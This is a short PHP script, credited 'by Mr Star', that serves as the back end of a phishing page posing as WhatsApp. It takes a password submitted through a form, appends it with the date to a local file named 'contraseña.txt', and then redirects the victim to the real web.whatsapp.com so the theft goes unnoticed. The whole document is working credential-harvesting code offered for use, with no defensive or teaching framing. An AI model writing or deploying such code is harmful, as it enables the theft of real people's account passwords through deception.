<?php
    $password = $_POST["password"];
    $pass = "\n Password: $password";
    $date = date('d-m-Y');
    $fileuser = fopen("contraseña.txt", "a");
    $cl = "\n ===========================================";
    fwrite($fileuser, " Date: $date \n $pass \n $cl");
    fclose($fileuser);
    header('Location: https://web.whatsapp.com/');
    exit();
//by Mr Star
?>
